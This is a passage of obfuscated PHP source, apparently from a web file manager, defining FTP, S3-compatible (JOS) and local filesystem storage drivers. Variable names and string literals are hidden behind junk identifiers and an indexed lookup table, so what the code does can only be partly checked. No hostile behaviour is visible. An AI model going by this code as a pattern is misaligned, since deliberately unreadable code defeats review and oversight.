$this->handle->flushall($†ªßêÅ); } return; } return $this->handle->flushAll(); } } goto B¿”‘ÙÓÈ; CÌÄ‰­Ãƒ: define($_SERVER[ü¢ÙÊñÛ][328], 2); define($_SERVER[ü¢ÙÊñÛ][329], 3); define($_SERVER[ü¢ÙÊñÛ][330], 1); goto FÓíï…®’; B£ç™…Îƒš: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($„Ÿã€œ”) { parent::__construct(); if (count($„Ÿã€œ”) > 0) { $this->_init($„Ÿã€œ”); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($«®¯ıÏ) { $ÃÛîÁì¦ =& $_SERVER[ü¢ÙÊñÛ]; global $config; $this->appCharset = $config[$ÃÛîÁì¦[1428]]; $this->systemCharset = $config[$ÃÛîÁì¦[1429]]; if (isset($«®¯ıÏ[$ÃÛîÁì¦[1430]]) && $«®¯ıÏ[$ÃÛîÁì¦[1430]]) { $this->systemCharset = $«®¯ıÏ[$ÃÛîÁì¦[1430]]; } } public function iconvApp($É”Ùø©ú) { return $this->iconvTo($É”Ùø©ú, $this->systemCharset, $this->appCharset); } public function iconvSystem($ˆ¡ÙÉÅö) { return $this->iconvTo($ˆ¡ÙÉÅö, $this->appCharset, $this->systemCharset); } public function getPathOuter($ô’ş¢é¿) { $ãÀ‹êß» =& $_SERVER[ü¢ÙÊñÛ]; $‚Ÿó¨âÍ = $this->iconvApp($this->pathBase); $ô’ş¢é¿ = $this->iconvApp($ô’ş¢é¿); if (substr($‚Ÿó¨âÍ, 0, 2) == $ãÀ‹êß»[1400]) { $‚Ÿó¨âÍ = BASIC_PATH . substr($‚Ÿó¨âÍ, 2); } if (substr($ô’ş¢é¿, 0, 2) == $ãÀ‹êß»[1400]) { $ô’ş¢é¿ = BASIC_PATH . substr($ô’ş¢é¿, 2); } $‚Ÿó¨âÍ = KodIO::clear($‚Ÿó¨âÍ); $ô’ş¢é¿ = KodIO::clear($ô’ş¢é¿); $ô’ş¢é¿ = substr($ô’ş¢é¿, strlen($‚Ÿó¨âÍ)); if (empty($this->pathDriver)) { return $ô’ş¢é¿; } return $this->pathDriver . $ãÀ‹êß»[18] . ltrim($ô’ş¢é¿, $ãÀ‹êß»[18]); } private function _init($ÅÄƒóØƒ = array()) { $‘ú®‰³¸ =& $_SERVER[ü¢ÙÊñÛ]; if (!function_exists($‘ú®‰³¸[1431])) { throw new Exception(LNG($‘ú®‰³¸[1432])); } $this->config = $ÅÄƒóØƒ; $this->charsetReset($ÅÄƒóØƒ); foreach ($ÅÄƒóØƒ as $µĞïŒä¹ => $÷±µ¨äÛ) { if (isset($this->{$µĞïŒä¹})) { $this->{$µĞïŒä¹} = $÷±µ¨äÛ; } } return $this->_login($ÅÄƒóØƒ); } private function _login($¼Ÿ¹ÈÒå) { $ËÌú—É =& $_SERVER[ü¢ÙÊñÛ]; static $ÖÖõŞ›¼ = array(); $ÈÛ™¾­ = md5(json_encode($¼Ÿ¹ÈÒå)); if (isset($ÖÖõŞ›¼[$ÈÛ™¾­])) { foreach ($ÖÖõŞ›¼[$ÈÛ™¾­] as $×÷í•æ => $˜ñàÊ²) { $this->{$×÷í•æ} = $˜ñàÊ²; } return !0; } $ŸßŒæÒñ = parse_url(trim($this->server, $ËÌú—É[18])); $this->host = $ŸßŒæÒñ[$ËÌú—É[219]]; $­æµ¡’˜ = isset($ŸßŒæÒñ[$ËÌú—É[218]]) && $ŸßŒæÒñ[$ËÌú—É[218]] == $ËÌú—É[1433] ? !0 : !1; $this->scheme = $­æµ¡’˜ ? $ËÌú—É[1434] : $ËÌú—É[1435]; $this->port = isset($ŸßŒæÒñ[$ËÌú—É[220]]) ? $ŸßŒæÒñ[$ËÌú—É[220]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ËÌú—É[1436]) . $this->host . $ËÌú—É[14] . $this->port, !0); return !1; } $²«òãÙŸ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$²«òãÙŸ) { $this->writeLog(LNG($ËÌú—É[1437]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $°îäß“¨ = $this->pasv == $ËÌú—É[102] ? !0 : !1; @ftp_pasv($this->connect, $°îäß“¨); $ÖÖõŞ›¼[$ÈÛ™¾­] = array($ËÌú—É[1438] => $this->connect, $ËÌú—É[219] => $this->host, $ËÌú—É[218] => $this->scheme, $ËÌú—É[220] => $this->port); return $²«òãÙŸ; } private function _isconn($àæÓ£Ü = true) { if (is_resource($this->connect)) { return !0; } if (!$àæÓ£Ü) { return !1; } return $this->_login($this->config); } public function mkfile($ƒ®ı£øÊ, $¬é†Øó = '', $©øè’áï = REPEAT_RENAME) { if ($this->setContent($ƒ®ı£øÊ, $¬é†Øó)) { return $this->getPathOuter($ƒ®ı£øÊ); } $this->writeLog(LNG($_SERVER[ü¢ÙÊñÛ][1439]), !0); return !1; } public function mkdir($‡ù‰¥Ø¿, $ßş±€¢€ = REPEAT_SKIP) { $·ì°†ú =& $_SERVER[ü¢ÙÊñÛ]; if (!$‡ù‰¥Ø¿ || $‡ù‰¥Ø¿ == $·ì°†ú[18]) { return !0; } if (!$this->_isconn()) { return !1; } $‡ù‰¥Ø¿ = $this->iconvSystem($‡ù‰¥Ø¿); if ($this->_isFolder($‡ù‰¥Ø¿) || @ftp_mkdir($this->connect, $‡ù‰¥Ø¿)) { return $this->getPathOuter($‡ù‰¥Ø¿); } if (!$this->mkdir($this->pathFather($‡ù‰¥Ø¿))) { return !1; } if ($‡ù‰¥Ø¿ = @ftp_mkdir($this->connect, $‡ù‰¥Ø¿)) { return $this->getPathOuter($‡ù‰¥Ø¿); } $this->writeLog(__FUNCTION__ . $·ì°†ú[1440], !0); return !1; } public function copyFile($òØüšú, $¿øÜÀ™Ä) { if (!$this->_isconn()) { return !1; } $Ïıƒû•’ = $this->pathThis($this->iconvSystem($òØüšú)); $‹»è¦Ç— = $this->tempFile($Ïıƒû•’); $‹¬³™ñµ = $this->iconvApp($‹»è¦Ç—); $this->download($òØüšú, $‹¬³™ñµ); $è®Ü¥ = $this->upload($¿øÜÀ™Ä, $‹¬³™ñµ); $this->tempFileRemve($‹»è¦Ç—); return $è®Ü¥; } public function moveFile($ŞŒÊûÁˆ, $ˆ“Ï«”) { if (!$this->_isconn()) { return !1; } $ŞŒÊûÁˆ = $this->iconvSystem($ŞŒÊûÁˆ); $ˆ“Ï«” = $this->iconvSystem($ˆ“Ï«”); $šˆ¬ï´ = @ftp_rename($this->connect, $ŞŒÊûÁˆ, $ˆ“Ï«”); if (!$šˆ¬ï´) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } return $this->getPathOuter($ˆ“Ï«”); } public function delFile($­â‚ÊÅÊ) { if (!$this->_isconn()) { return !1; } $­â‚ÊÅÊ = $this->iconvSystem($­â‚ÊÅÊ); $ı‚Ğ•¶ = @ftp_delete($this->connect, $­â‚ÊÅÊ); if (!$ı‚Ğ•¶) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); } return $ı‚Ğ•¶; } public function delFolder($²æ©˜öõ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $èî¸‘Ïğ = $èƒº‰• = array(); $this->fileList($²æ©˜öõ, $èî¸‘Ïğ, $èƒº‰•, !0); $this->listItemCache = !0; foreach ($èƒº‰• as $¦³¼’î¬) { $»«û¾íÌ = $this->iconvSystem($¦³¼’î¬[$_SERVER[ü¢ÙÊñÛ][42]]); $£™ÃºÒŞ = @ftp_delete($this->connect, $»«û¾íÌ); if (!$£™ÃºÒŞ) { return !1; } } foreach ($èî¸‘Ïğ as $»«û¾íÌ) { $»«û¾íÌ = $this->iconvSystem($»«û¾íÌ); $£™ÃºÒŞ = @ftp_rmdir($this->connect, $»«û¾íÌ); if (!$£™ÃºÒŞ) { return !1; } } $²æ©˜öõ = $this->iconvSystem($²æ©˜öõ); return @ftp_rmdir($this->connect, $²æ©˜öõ); } public function rename($€Å‡Éå¿, $ ñŞı›) { $‡°š³œë =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->_isconn()) { return !1; } $‹¸¹×Œ = $this->fileNameAuto($this->pathFather($€Å‡Éå¿), $ ñŞı›); $‹¸¹×Œ = $this->iconvSystem($‹¸¹×Œ); $€Å‡Éå¿ = $this->iconvSystem($€Å‡Éå¿); $„»ª´‚· = $this->pathFather($€Å‡Éå¿); $‡’”å½ = rtrim($„»ª´‚·, $‡°š³œë[18]) . $‡°š³œë[18] . $‹¸¹×Œ; $–üĞËŸÛ = @ftp_rename($this->connect, $€Å‡Éå¿, $‡’”å½); if (!$–üĞËŸÛ) { $this->writeLog(__FUNCTION__ . $‡°š³œë[1440], !0); return !1; } $‡’”å½ = $this->iconvApp($‡’”å½); return $this->getPathOuter($‡’”å½); } private function folderInfo($ãü¼€í, $ÅÔ©‚ôú = false) { $Ë‰´àÅó =& $_SERVER[ü¢ÙÊñÛ]; $Ö¶¢Á‘† = array($Ë‰´àÅó[42] => $this->pathThis($ãü¼€í), $Ë‰´àÅó[98] => $this->getPathOuter($Ë‰´àÅó[18] . $ãü¼€í), $Ë‰´àÅó[43] => $Ë‰´àÅó[89]); if ($ÅÔ©‚ôú) { return $Ö¶¢Á‘†; } $Ö¶¢Á‘†[$Ë‰´àÅó[244]] = $Ö¶¢Á‘†[$Ë‰´àÅó[99]] = 0; $Ö¶¢Á‘†[$Ë‰´àÅó[245]] = $Ö¶¢Á‘†[$Ë‰´àÅó[246]] = !0; return $Ö¶¢Á‘†; } private function fileInfo($¥ãˆ¼, $âáî©¤ô = false, $‡ĞØ¦£Ê = array()) { $Ûåå´¬µ =& $_SERVER[ü¢ÙÊñÛ]; $À‡À±„¿ = array($Ûåå´¬µ[42] => $this->pathThis($¥ãˆ¼), $Ûåå´¬µ[98] => $this->getPathOuter($Ûåå´¬µ[18] . $¥ãˆ¼), $Ûåå´¬µ[43] => $Ûåå´¬µ[243], $Ûåå´¬µ[90] => isset($‡ĞØ¦£Ê[$Ûåå´¬µ[90]]) ? $‡ĞØ¦£Ê[$Ûåå´¬µ[90]] : 0, $Ûåå´¬µ[180] => $this->ext($¥ãˆ¼)); if ($âáî©¤ô) { return $À‡À±„¿; } $À‡À±„¿[$Ûåå´¬µ[244]] = $À‡À±„¿[$Ûåå´¬µ[99]] = 0; $À‡À±„¿[$Ûåå´¬µ[245]] = $À‡À±„¿[$Ûåå´¬µ[246]] = !0; $Æùºãª× = $this->iconvSystem($¥ãˆ¼); $À‡À±„¿[$Ûåå´¬µ[99]] = @ftp_mdtm($this->connect, $Æùºãª×); if (empty($‡ĞØ¦£Ê)) { $‡ĞØ¦£Ê = $this->objectMeta($¥ãˆ¼); if (!$‡ĞØ¦£Ê) { return $À‡À±„¿; } } $À‡À±„¿[$Ûåå´¬µ[90]] = $‡ĞØ¦£Ê[$Ûåå´¬µ[90]]; return $À‡À±„¿; } public function size($Ã×òœãµ) { $Õïùˆ° = $this->objectMeta($Ã×òœãµ); return $Õïùˆ° ? $Õïùˆ°[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function info($æäúµÇ·) { if ($this->isFile($æäúµÇ·)) { return $this->fileInfo($æäúµÇ·, 0); } else { if ($this->isFolder($æäúµÇ·)) { return $this->folderInfo($æäúµÇ·); } } return !1; } private function fileList($­çşõÎˆ, &$ª÷¡áôô, &$…´±Êóˆ, $ŞÂƒ¶ø’ = false) { $ŸƒÂŞ·ã =& $_SERVER[ü¢ÙÊñÛ]; $­çşõÎˆ = $this->iconvSystem($­çşõÎˆ); if (!$this->isFolder($­çşõÎˆ)) { return !1; } @ftp_chdir($this->connect, $ŸƒÂŞ·ã[18]); $­çşõÎˆ = rtrim($­çşõÎˆ, $ŸƒÂŞ·ã[18]) . $ŸƒÂŞ·ã[18]; check_abort(); $°§äâ¡â = @ftp_rawlist($this->connect, $­çşõÎˆ); if (!$°§äâ¡â) { $°§äâ¡â = array(); } $³ƒ¢½Œ = array($ŸƒÂŞ·ã[20] => 1, $ŸƒÂŞ·ã[1352] => 1); foreach ($°§äâ¡â as $çËõ›É¤) { $éå¤Íè‰ = $this->_listItem($çËõ›É¤); if ($éå¤Íè‰[0] == $ŸƒÂŞ·ã[823]) { continue; } $áÄÈï® = $éå¤Íè‰[8]; if (empty($áÄÈï®) && $áÄÈï® !== $ŸƒÂŞ·ã[241] || isset($³ƒ¢½Œ[$áÄÈï®])) { continue; } $áÄÈï® = $this->iconvApp($­çşõÎˆ . ltrim($áÄÈï®, $ŸƒÂŞ·ã[18])); $­±ˆá ø = array($ŸƒÂŞ·ã[42] => $áÄÈï®, $ŸƒÂŞ·ã[43] => $ŸƒÂŞ·ã[243], $ŸƒÂŞ·ã[90] => $éå¤Íè‰[4]); if (substr($çËõ›É¤, 0, 1) == $ŸƒÂŞ·ã[1441]) { $­±ˆá ø[$ŸƒÂŞ·ã[43]] = $ŸƒÂŞ·ã[89]; $­±ˆá ø[$ŸƒÂŞ·ã[90]] = 0; } $Ô‚ĞÏ¸å = $­±ˆá ø[$ŸƒÂŞ·ã[43]] == $ŸƒÂŞ·ã[89] ? !0 : !1; $this->cacheMethodInfoSet($áÄÈï®, $Ô‚ĞÏ¸å, $­±ˆá ø); if ($Ô‚ĞÏ¸å) { $ª÷¡áôô[] = $áÄÈï®; if ($ŞÂƒ¶ø’) { $this->fileList($áÄÈï®, $ª÷¡áôô, $…´±Êóˆ, $ŞÂƒ¶ø’); } continue; } $…´±Êóˆ[] = $­±ˆá ø; } $this->cacheMethodInfoSet($­çşõÎˆ, !0); } private function _listItem($ÏÓ´Ş¤Å) { if (empty($ÏÓ´Ş¤Å)) { return array(); } $Éüö»ğ¨ = preg_split($_SERVER[ü¢ÙÊñÛ][1442], $ÏÓ´Ş¤Å); if (count($Éüö»ğ¨) <= 9) { return $Éüö»ğ¨; } $Éüö»ğ¨[8] = trim(substr($ÏÓ´Ş¤Å, strpos($ÏÓ´Ş¤Å, $Éüö»ğ¨[7]) + strlen($Éüö»ğ¨[7]))); return array_splice($Éüö»ğ¨, 0, 9); } public function listPath($—ùò…, $ÉÆç˜™» = false) { $¥È†‹õ¹ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->_isconn()) { return !1; } $«øµ†… = $Ìñ«­èÏ = array(); $this->fileList($—ùò…, $«øµ†…, $Ìñ«­èÏ); foreach ($«øµ†… as $ ˜»—¦§ => $ŒÂ×Ş) { $«øµ†…[$ ˜»—¦§] = $this->folderInfo($ŒÂ×Ş, $ÉÆç˜™»); } foreach ($Ìñ«­èÏ as $ ˜»—¦§ => $ŒÂ×Ş) { $Ìñ«­èÏ[$ ˜»—¦§] = $this->fileInfo($ŒÂ×Ş[$¥È†‹õ¹[42]], $ÉÆç˜™», $ŒÂ×Ş); } return array($¥È†‹õ¹[96] => $«øµ†…, $¥È†‹õ¹[97] => $Ìñ«­èÏ); } public function has($ß£Ğ¿¢¶, $¤»Ğ±ë‰ = false, $¿ª¯€ = true) { $¸÷ÂÈ› =& $_SERVER[ü¢ÙÊñÛ]; $™íÕÁøÏ = $È“öŒµÂ = array(); $ƒñßö•¥ = $¤»Ğ±ë‰ ? !0 : !1; $this->fileList($ß£Ğ¿¢¶, $™íÕÁøÏ, $È“öŒµÂ, $ƒñßö•¥); if ($¤»Ğ±ë‰) { return array($¸÷ÂÈ›[252] => count($È“öŒµÂ), $¸÷ÂÈ›[253] => count($™íÕÁøÏ)); } if ($¿ª¯€) { if (count($È“öŒµÂ)) { return !0; } } else { if (count($™íÕÁøÏ)) { return !0; } } return !1; } public function listAll($ÃúÏğ™) { $Òò›ù·› =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->_isconn()) { return !1; } $ñìÇİÜ = $áÙ­üŞï = array(); $this->fileList($ÃúÏğ™, $ñìÇİÜ, $áÙ­üŞï, !0); $ú®ıê—İ = array_to_keyvalue($áÙ­üŞï, $Òò›ù·›[42]); foreach ($ñìÇİÜ as $ŒˆÆ¼»¦) { if (is_string($ŒˆÆ¼»¦)) { $ú®ıê—İ[$ŒˆÆ¼»¦] = array($Òò›ù·›[90] => 0); } } return $this->listAllFiles($ÃúÏğ™, $ú®ıê—İ); } public function getContent($Ù—¤İˆô) { if (!$this->_isconn()) { return !1; } $Ù—¤İˆô = $this->iconvSystem($Ù—¤İˆô); return $this->fileSubstr($Ù—¤İˆô); } public function setContent($õ‚Ù¡¢é, $¬¾Âë´ = '') { if (!$this->_isconn()) { return !1; } $ç½“ı„› = $this->pathThis($this->iconvSystem($õ‚Ù¡¢é)); $úõ¨úæ± = $this->tempFile($ç½“ı„›); file_put_contents($úõ¨úæ±, $¬¾Âë´); $òúæ¶¦… = $this->upload($õ‚Ù¡¢é, $this->iconvApp($úõ¨úæ±)); $this->tempFileRemve($úõ¨úæ±); return $òúæ¶¦…; } public function fileSubstr($Š—•Ú×¿, $íâ™×¾§ = 0, $Û…ø™á˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Š—•Ú×¿, $íâ™×¾§, $Û…ø™á˜); } private function ftpRequest($¶®ûúêÇ, $à­øÁ¡ = 0, $üªºĞ™õ = false) { $¶®ûúêÇ = $this->iconvSystem($¶®ûúêÇ); $æ°‡‘Éœ = $this->scheme . $this->host . $_SERVER[ü¢ÙÊñÛ][14] . $this->port; $ÖÊÇ”‘ = curl_init(); curl_setopt($ÖÊÇ”‘, CURLOPT_URL, $æ°‡‘Éœ . $this->pathEncode($¶®ûúêÇ)); curl_setopt($ÖÊÇ”‘, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($üªºĞ™õ) { $¾¨Ú¶İ” = $à­øÁ¡ + $üªºĞ™õ - 1; curl_setopt($ÖÊÇ”‘, CURLOPT_RANGE, "{$à­øÁ¡}\55{$¾¨Ú¶İ”}"); } curl_setopt($ÖÊÇ”‘, CURLOPT_RETURNTRANSFER, 1); $¥›û÷…Ü = curl_exec($ÖÊÇ”‘); curl_close($ÖÊÇ”‘); return $¥›û÷…Ü; } public function upload($¾óÉñ·ó, $¨ä–Ÿ×…, $ãêÜóÙ = false, $›Ô¥ÃÎÈ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¾óÉñ·ó))) { return !1; } $¾óÉñ·ó = $this->iconvSystem($¾óÉñ·ó); $¨ä–Ÿ×… = $this->iconvSystem($¨ä–Ÿ×…); $Ø®Ş¼¿¤ = ftp_nb_put($this->connect, $¾óÉñ·ó, $¨ä–Ÿ×…, FTP_BINARY); while ($Ø®Ş¼¿¤ == FTP_MOREDATA) { $Ø®Ş¼¿¤ = ftp_nb_continue($this->connect); } if ($Ø®Ş¼¿¤ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } return $this->getPathOuter($¾óÉñ·ó); } public function download($ú¿©ïÔ­, $€½ÈüÁŒ = '') { if (!$this->_isconn()) { return !1; } $‰ŠŒÒ¡™ = $this->pathFather($€½ÈüÁŒ); if (!IO::mkdir($‰ŠŒÒ¡™)) { return !1; } $ú¿©ïÔ­ = $this->iconvSystem($ú¿©ïÔ­); $€½ÈüÁŒ = $this->iconvSystem($€½ÈüÁŒ); $ß¾®÷¤¤ = ftp_nb_get($this->connect, $€½ÈüÁŒ, $ú¿©ïÔ­, FTP_BINARY); while ($ß¾®÷¤¤ == FTP_MOREDATA) { $ß¾®÷¤¤ = ftp_nb_continue($this->connect); } if ($ß¾®÷¤¤ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } return $this->iconvApp($€½ÈüÁŒ); } public function exist($µ·ÔŞÌ¨) { return $this->isFile($µ·ÔŞÌ¨) || $this->isFolder($µ·ÔŞÌ¨); } public function isFile($İ¿íşˆ) { return !$this->isFolder($İ¿íşˆ) && $this->objectMeta($İ¿íşˆ); } public function isFolder($Áúœ»¤µ) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][190], $Áúœ»¤µ); } protected function objectMeta($ôß¿Ïì‡) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][192], $ôß¿Ïì‡); } protected function _objectMeta($Æü‡ŞÍ¶) { $ôçÉ¨Õ =& $_SERVER[ü¢ÙÊñÛ]; if ($Æü‡ŞÍ¶ == $ôçÉ¨Õ[22] || $Æü‡ŞÍ¶ == $ôçÉ¨Õ[18]) { return array(); } if (!$this->_isconn()) { return !1; } $Æü‡ŞÍ¶ = $this->iconvSystem($Æü‡ŞÍ¶); $î‡‹Ğè = array($ôçÉ¨Õ[42] => $this->iconvApp($Æü‡ŞÍ¶), $ôçÉ¨Õ[43] => $ôçÉ¨Õ[243], $ôçÉ¨Õ[90] => 0); @ftp_chdir($this->connect, $ôçÉ¨Õ[18]); $·¯¨¾„Ş = @ftp_size($this->connect, $Æü‡ŞÍ¶); if ($·¯¨¾„Ş != -1) { $î‡‹Ğè[$ôçÉ¨Õ[90]] = $·¯¨¾„Ş; } else { $ùÄè•š¨ = @ftp_chdir($this->connect, $Æü‡ŞÍ¶); if (!$ùÄè•š¨) { return !1; } $î‡‹Ğè[$ôçÉ¨Õ[43]] = $ôçÉ¨Õ[89]; } return $î‡‹Ğè; } protected function _isFolder($œ£×Üí) { $×¾æÏ =& $_SERVER[ü¢ÙÊñÛ]; if ($œ£×Üí == $×¾æÏ[22] || $œ£×Üí == $×¾æÏ[18]) { return !0; } $—”Û‚¨õ = $this->_objectMeta($œ£×Üí); return isset($—”Û‚¨õ[$×¾æÏ[43]]) && $—”Û‚¨õ[$×¾æÏ[43]] == $×¾æÏ[89] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($êıÀ¸å¼) { parent::__construct($êıÀ¸å¼); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } public function uploadLink($å½Ó–â, $“šÀå•ü = 0) { $ú££Ä›ù =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isUploadServer()) { return; } $ğªóÑ¤‹ = $this->getType(); if (!in_array($ğªóÑ¤‹, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $µé¤È† = (!$“šÀå•ü ? 1 : ceil($“šÀå•ü / pow(1024, 3))) * 3600 * 4; $Ûùì’”ï = $this->uploadMultiData($å½Ó–â, $µé¤È†); if ($Ûùì’”ï) { $Ûùì’”ï[$ú££Ä›ù[108]] = $å½Ó–â; $Ûùì’”ï[$ú££Ä›ù[109]] = $ğªóÑ¤‹; } return $Ûùì’”ï; } public function fileOutImage($Êóš¢Ç¼, $Éò“Çú = 250) { if ($this->size($Êóš¢Ç¼) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Êóš¢Ç¼, $Éò“Çú); } $Ó¸§ş = $this->link($Êóš¢Ç¼); $Ó¸§ş .= $_SERVER[ü¢ÙÊñÛ][1443] . $Éò“Çú; $this->fileOutLink($Ó¸§ş); } public function fileOutLink($ Ò¬îæ) { $ò—¤»¶ö =& $_SERVER[ü¢ÙÊñÛ]; if (substr($ Ò¬îæ, 0, 7) == $ò—¤»¶ö[229]) { $ Ò¬îæ = $ò—¤»¶ö[230] . substr($ Ò¬îæ, 7); } header($ò—¤»¶ö[186] . $ Ò¬îæ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ç¦à†å¹) { if (substr($Ç¦à†å¹, 0, 2) == $_SERVER[ü¢ÙÊñÛ][1400]) { $Ç¦à†å¹ = BASIC_PATH . substr($Ç¦à†å¹, 2); } return $Ç¦à†å¹; } public function iconvApp($Ñ¾²îÀú) { $Î¨’®í­ =& $_SERVER[ü¢ÙÊñÛ]; global $config; return $this->iconvTo($Ñ¾²îÀú, $config[$Î¨’®í­[1429]], $config[$Î¨’®í­[1428]]); } public function iconvSystem($ü²±ãÀ) { $€×¼‹Ÿã =& $_SERVER[ü¢ÙÊñÛ]; global $config; return $this->iconvTo($ü²±ãÀ, $config[$€×¼‹Ÿã[1428]], $config[$€×¼‹Ÿã[1429]]); } public function getPathOuter($‹‰„¦£À) { $¤ÔÙ·ä =& $_SERVER[ü¢ÙÊñÛ]; $¬Ä ¼óı = $this->iconvApp($this->pathBase); $‹‰„¦£À = $this->iconvApp($‹‰„¦£À); if (substr($¬Ä ¼óı, 0, 2) == $¤ÔÙ·ä[1400]) { $¬Ä ¼óı = BASIC_PATH . substr($¬Ä ¼óı, 2); } if (substr($‹‰„¦£À, 0, 2) == $¤ÔÙ·ä[1400]) { $‹‰„¦£À = BASIC_PATH . substr($‹‰„¦£À, 2); } $¬Ä ¼óı = KodIO::clear($¬Ä ¼óı); $‹‰„¦£À = KodIO::clear($‹‰„¦£À); $‹‰„¦£À = substr($‹‰„¦£À, strlen($¬Ä ¼óı)); if (empty($this->pathDriver)) { return $‹‰„¦£À; } return $this->pathDriver . $¤ÔÙ·ä[18] . ltrim($‹‰„¦£À, $¤ÔÙ·ä[18]); } public function mkfile($ÉÖÆ£ Ğ, $¬“Ÿª”İ = '', $Ê¯êˆü = REPEAT_RENAME) { $ÉÖÆ£ Ğ = $this->iconvSystem($ÉÖÆ£ Ğ); @touch($ÉÖÆ£ Ğ); if ($¬“Ÿª”İ) { file_put_contents($ÉÖÆ£ Ğ, $¬“Ÿª”İ); } @chmod($ÉÖÆ£ Ğ, $this->pathAuth); if (is_file($ÉÖÆ£ Ğ)) { return $this->getPathOuter($ÉÖÆ£ Ğ); } $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } public function mkdir($»æŠ¨», $Ì§Ç¸İ† = REPEAT_SKIP) { $»æŠ¨» = $this->iconvSystem($»æŠ¨»); if (is_dir($»æŠ¨»)) { return $this->getPathOuter($»æŠ¨»); } @mkdir($»æŠ¨», $this->pathAuth, !0); @chmod($»æŠ¨», $this->pathAuth); if (is_dir($»æŠ¨»)) { return $this->getPathOuter($»æŠ¨»); } $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } public function copyFile($µ‡×»„Í, $¼Œ¨âÜÀ) { $this->mkdir($this->pathFather($¼Œ¨âÜÀ)); $µ‡×»„Í = $this->iconvSystem($µ‡×»„Í); $¼Œ¨âÜÀ = $this->iconvSystem($¼Œ¨âÜÀ); $šÃŞİë€ = copy_64($µ‡×»„Í, $¼Œ¨âÜÀ); @chmod($¼Œ¨âÜÀ, $this->pathAuth); if ($šÃŞİë€) { return $this->getPathOuter($¼Œ¨âÜÀ); } $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } public function moveFile($Ï“¦Ó‡æ, $¥¢¨€ó) { $this->mkdir($this->pathFather($¥¢¨€ó)); $Ï“¦Ó‡æ = $this->iconvSystem($Ï“¦Ó‡æ); $¥¢¨€ó = $this->iconvSystem($¥¢¨€ó); $ä–›¯Ô = intval(@rename($Ï“¦Ó‡æ, $¥¢¨€ó)); if (!$ä–›¯Ô) { if ($ä–›¯Ô = intval(@copy_64($Ï“¦Ó‡æ, $¥¢¨€ó))) { @unlink($Ï“¦Ó‡æ); } } @chmod($¥¢¨€ó, $this->pathAuth); if ($ä–›¯Ô) { return $this->getPathOuter($¥¢¨€ó); } $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } public function movePath($ÒË¡‚¬, $áÒä‰Ò™, $‘¸¼±Ë = false) { $‹ÆœëÕ =& $_SERVER[ü¢ÙÊñÛ]; $ÒË¡‚¬ = $this->iconvSystem($ÒË¡‚¬); $áÒä‰Ò™ = $this->iconvSystem($áÒä‰Ò™); $Š¯æÌò² = rtrim($áÒä‰Ò™, $‹ÆœëÕ[18]) . $‹ÆœëÕ[18] . ($‘¸¼±Ë ? $‘¸¼±Ë : get_path_this($ÒË¡‚¬)); if (file_exists($Š¯æÌò²)) { return !1; } $³¤•œ½ = intval(@rename($ÒË¡‚¬, $Š¯æÌò²)); $³¤•œ½ = file_exists($Š¯æÌò²); if ($³¤•œ½) { return $this->getPathOuter($Š¯æÌò²); } $this->writeLog(__FUNCTION__ . $‹ÆœëÕ[1440], !0); return !1; } public function delFile($İ¨ØîÌ¦) { $İ¨ØîÌ¦ = $this->iconvSystem($İ¨ØîÌ¦); if (!@unlink($İ¨ØîÌ¦)) { @chmod($İ¨ØîÌ¦, $this->pathAuth); if (@unlink($İ¨ØîÌ¦)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); return !1; } return !0; } public function delFolder($øçûÚ š) { $å°äß¸Ë =& $_SERVER[ü¢ÙÊñÛ]; $øçûÚ š = $this->iconvSystem($øçûÚ š); if (!is_dir($øçûÚ š)) { return !0; } if (!($óæØâÄæ = opendir($øçûÚ š))) { return !1; } while (($¥Ÿä«±ì = readdir($óæØâÄæ)) !== !1) { if ($¥Ÿä«±ì == $å°äß¸Ë[20] || $¥Ÿä«±ì == $å°äß¸Ë[1352]) { continue; } $Š¢×Ú£ = $øçûÚ š . $å°äß¸Ë[18] . $¥Ÿä«±ì; if (is_file($Š¢×Ú£) || is_link($Š¢×Ú£)) { if (!unlink($Š¢×Ú£)) { chmod($Š¢×Ú£, $this->pathAuth); if (!unlink($Š¢×Ú£)) { return !1; } } } else { if (is_dir($Š¢×Ú£)) { chmod($Š¢×Ú£, $this->pathAuth); $Š¢×Ú£ = 